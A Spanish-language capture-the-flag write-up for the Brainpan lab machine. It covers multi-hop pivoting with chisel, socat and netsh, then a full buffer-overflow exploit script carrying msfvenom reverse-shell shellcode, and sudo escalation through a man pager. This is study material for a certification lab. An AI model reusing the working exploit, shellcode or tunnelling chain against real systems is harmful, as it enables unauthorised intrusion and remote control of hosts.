#ctf-machine #vulnhub #medium-machine #windows #simulacion-eccptv2  [[Simulation eCPPTv2 Map.canvas|Simulation eCPPTv2 Map]]

## Pivoting
Nos encontramos en la máquina "172.18.0.129" (Matrix 1) por lo que si listamos las interfaces de red vemos que tiene una más:
![[Pasted image 20240830225051.png]]

Como no llegamos a este segmento, primero debemos de configurar un *proxy* por lo que primeramente nos ponemos con `chisel` como servidor desde nuestra máquina por el puerto 54321:
![[Pasted image 20240830225236.png]]

Una vez puesto en escucha, accedemos a la máquina "192.168.159.147" y con `socat` hacemos que todo el tráfico de red que llegue por el puerto 54321 lo transfiera a nuestra máquina por el puerto 54321:
![[Pasted image 20240830225546.png]]

Seguidamente en la máquina "10.10.0.129", hacemos que todo el tráfico de red que llegue por su puerto 54321 lo transfiera a la máquina "10.10.0.128" (192.168.159.147) por el puerto 54321:
![[Pasted image 20240830225942.png]]

Ahora en la máquina "192.168.100.130" (172.10.0.128) utilizamos `netsh` para redirigir el tráfico del puerto 54321 de la máquina a la máquina 192.168.100.128 (10.10.0.129):
![[Pasted image 20240830232548.png]]
![[Pasted image 20240830232614.png]]

Por lo que ahora solamente queda transferir `chisel` a la máquina "172.18.0.129" utilizando `scp`:
![[Pasted image 20240830232955.png]]

Una vez transferido, lo ejecutamos para conectarnos a la máquina 172.10.0.128 por el puerto 54321:
![[Pasted image 20240830233342.png]]
> [!NOTE] Aparece la IP 172.18.0.131 porque al reiniciar la máquina se le ha cambiado al IP.

Así que ya tenemos el *proxy* configurado:
![[Pasted image 20240830233434.png]]

Y podemos añadirlo en `/etc/proxychains4.conf`

Por lo que podemos hacer un escaneo de *hosts* con este *script* en "bash" y `proxychains`:
```bash
for i in $(seq 1 254); do
  ping -c 1 10.15.12.$i -W 1 > /dev/null && echo "[+] Host 10.15.12.$i" &
done; wait
```
![[Pasted image 20240830233842.png]]

Como vemos hay un *host* más. 

## Enumeración inicial
Hacemos un escaneo para detectar los puertos abiertos de este *host*:
![[Pasted image 20240831000739.png]]

Como vemos hay 2 puertos abiertos el puerto 9999 y el puerto 10000. Por lo que lanzamos un `whatweb` junto a `proxychains` para ver si se trata de un servicio web:
![[Pasted image 20240831105132.png]]

Como vemos el puerto 10000 se trata de un servicio web. Por lo que añadimos el *proxy* en `foxyproxy` para poder alcanzar a la web.
![[Pasted image 20240831105301.png]]

Por lo que si accedemos a la web vemos lo siguiente:
![[Pasted image 20240831113401.png]]

Para hacer fuerza bruta, como `gobuster` no funciona correctamente, creamos un *script* en Python que busca directorios:
```python
import requests
import signal, sys
from pwn import *
from concurrent.futures import ThreadPoolExecutor

file = "/usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"

URL = "http://10.15.12.129:10000/"

def sig_handler(sig, frame):
    print("\n\n[!] Saliendo...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)


with open(file, 'r') as f:
    data = f.read()
    

names = data.split('\n')

p1 = log.progress("Progress")

def try_dir(url, i):

    try:
        p1.status(str(i)+'/'+str(len(names)))
        r = requests.get(url, proxies={'http': 'socks5://127.0.0.1:1083'}, timeout=5)
        if r.status_code != 404:
            print(url)
    except:
        pass

with ThreadPoolExecutor(max_workers=2) as executor:
    executor.map(lambda name: try_dir(URL+name, names.index(name)), names)
```

Si lo ejecutamos, vemos que hay un directorio `/bin/`:
![[Pasted image 20240831124901.png]]

Que si accedemos en la web vemos que contiene un archivo llamado "brainpan.exe":
![[Pasted image 20240831124924.png]]

Si utilizamos `nc` para conectarnos al puerto 9999, vemos lo siguiente:
![[Pasted image 20240831122826.png]]

## Buffer overflow
Parece un binario igual que el que nos han proporcionado por la web. Por lo que utilizamos una máquina Windows 7 de 32 bits para intentar acontecer un *Buffer Overflow*. Si probamos de conectarnos a la máquina nuestra máquina Windows la cual está corriendo el ejecutable por el puerto 9999 y probamos de acontecer un *buffer overflow*:
![[Pasted image 20240831124007.png]]

Vemos desde el Inmunity Debugger que se accontece un buffer overflow y se sobrescribe el registro EIP:
![[Pasted image 20240831124124.png]]

Por lo que debemos de intentar identificar primeramente el *offset* hasta llegar al EIP. Así que generamos un *pattern* de 1000 caracteres y miramos qué valor aparece en el EIP:
![[Pasted image 20240831124457.png]]
![[Pasted image 20240831124517.png]]
![[Pasted image 20240831124541.png]]

Como vemos aparece el valor "35724134" por lo que lo buscamos con `pattern_offset` para saber el número de caracteres que hay que introducir antes de sobrescribir el EIP:
![[Pasted image 20240831124730.png]]

Como vemos el *offset* es 524 por lo que si generamos 524 caracteres y concatenamos cuatro 'C' deberemos de verlo en el registro EIP:
![[Pasted image 20240831125105.png]]
![[Pasted image 20240831125142.png]]

Por lo que ya tenemos el control del EIP. 
Ahora debemos de identificar el *offset* del *stack* así que volvemos a enviar el *pattern* anterior y como vemos el ESP apunta a:
![[Pasted image 20240831142831.png]]

Que si accedemos a su contenido:
![[Pasted image 20240831142857.png]]

Por lo que buscamos el *pattern* con `pattern_offset`:
![[Pasted image 20240831143100.png]]

Como vemos el *offset* del *stack* es 528. Es decir a continuación del registro EIP.

Ahora debemos de detectar los *badchars* por lo que generamos un array de *bytes* con `mona` excluyendo el "x00":
![[Pasted image 20240831125606.png]]
![[Pasted image 20240831143815.png]]

Estos bytes serán los que introduzcamos después del valor del EIP. Para hacerlo de forma más fácil hacemos un script de *Python*:
```python
import socket

IP = "192.168.159.137"
PORT = 9999

offset = 524
eip = b'CCCC'
# shellcode = b'BBBB'
shellcode = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
shellcode += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
shellcode += b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
shellcode += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
shellcode += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
shellcode += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
shellcode += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
shellcode += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

data = b'A'*offset + eip + shellcode

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP, PORT))
    s.send(data)
```

Si lo ejecutamos vemos que el valor del ESP es:
![[Pasted image 20240831131008.png]]

Por lo que si utilizamos `mona` para comparar con el *bytearray* original podemos saber si hay algún *badchar*:
![[Pasted image 20240831144128.png]]

Como vemos solo tenemos el `0x00` de *badchar* por lo que podemos generar un *shellcode* para que nos entable una *reverse shell* por el puerto 4444 de la máquina "10.15.12.128" (172.18.0.129) con `msfvenom`:
![[Pasted image 20240831170007.png]]

Una vez generado, buscamos el *opcode* de "nop" con `mona` para añadirle unos cuantos "nops" antes del *shellcode*:
![[Pasted image 20240831144844.png]]

Como vemos es el valor de `\x90` por lo que lo añadiremos unos 32 antes del *shellcode*. 

Finalmente, solo nos falta encontrar una dirección de memoria para asignárselo al ESP que contenga la instrucción "JMP ESP" para que se ejecute nuestro *shell code*. 
Así que lo buscamos con `mona`:
![[Pasted image 20240831145626.png]]

Como vemos lo encontramos en `0x311712F3`.

> [!NOTE] Esta dirección habrá que girarla en el código python

Por lo que unificamos todo en el código Python:
```python
import socket

IP = "10.15.12.129"
# IP = "192.168.159.137"

PORT = 9999

offset = 524
eip = b"\xf3\x12\x17\x31" # 0x311712f3
# shellcode = b'BBBB'
shellcode =  b"\x90"*32
shellcode += b"\xba\xd3\x2f\x6f\x3e\xdd\xc1\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x12\x31\x56\x12\x83\xee\xfc"
shellcode += b"\x03\x85\x21\x8d\xcb\x18\xe5\xa6\xd7\x09\x5a"
shellcode += b"\x1a\x72\xaf\xd5\x7d\x32\xc9\x28\xfd\xa0\x4c"
shellcode += b"\x03\xc1\x0b\xee\x2a\x47\x6d\x86\xa6\xb8\x81"
shellcode += b"\xd6\xdf\xc4\x99\xc7\x43\x40\x78\x57\x1d\x02"
shellcode += b"\x2a\xc4\x51\xa1\x45\x0b\x58\x26\x07\xa3\x0d"
shellcode += b"\x08\xdb\x5b\xba\x79\x34\xf9\x53\x0f\xa9\xaf"
shellcode += b"\xf0\x86\xcf\xff\xfc\x55\x8f"
data = b'A'*offset + eip + shellcode

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP, PORT))
    s.send(data)
```


Ahora únicamente no falta completar el túnel del puerto 4444. Por lo que en la máquina "192.168.159.147" utilizamos `socat` para que todo el tráfico que le llegue por el puerto 4444 lo mande a nuestra máquina "192.168.159.131" por el puerto 4444:
![[Pasted image 20240831155432.png]]

Seguidamente en la máquina "10.10.0.129" (192.168.100.128) hacemos que todo el tráfico por el puerto 4444 lo mande a la 10.10.0.128 (192.168.159.147) por el puerto 4444:
![[Pasted image 20240831165358.png]]


Por lo que en la máquina "192.168.100.130" (172.18.0.128) utilizamos `netsh` para que el tráfico que le llegue por el puerto 4444 lo mande a la máquina "192.169.100.128" (10.10.0.129) por el puerto 4444.
![[Pasted image 20240831163718.png]]

Una vez establecido, en la máquina "172.18.0.129" (10.15.12.128) mandamos todo el tráfico de red del puerto 4444 a la "172.18.0.128" (192.168.100.130) por el puerto 4444:
![[Pasted image 20240831163745.png]]

>[!NOTE] Aparece la IP 172.18.0.133 porque después de un reinicio se la ha cambiado la IP.

Por lo que si ejecutamos el *script* de Python obtenemos una conexión en el puerto 4444:
![[Pasted image 20240831170129.png]]

Así que hacemos el tratamiento de la TTY:
![[Pasted image 20240831170241.png]]
![[Pasted image 20240831170318.png]]


## Escalada de privilegios
Si mostramos los permisos a nivel de *sudoers* vemos:
![[Pasted image 20240831170620.png]]

Si lo ejecutamos vemos que hay una opción de abrir el manual de un comando:
![[Pasted image 20240831170740.png]]
Por lo que si abrimos el manual de "ls" por ejemplo, y seguidamente introducimos "!/bin/bash" en el modo *paginate*, obtenemos una bash como *root*:
![[Pasted image 20240831170843.png]]
![[Pasted image 20240831170851.png]]

Y podemos visualizar la *flag* en el directorio `/root`:
![[Pasted image 20240831170936.png]]


___
#buffer-overflow #abusing-sudoers 
___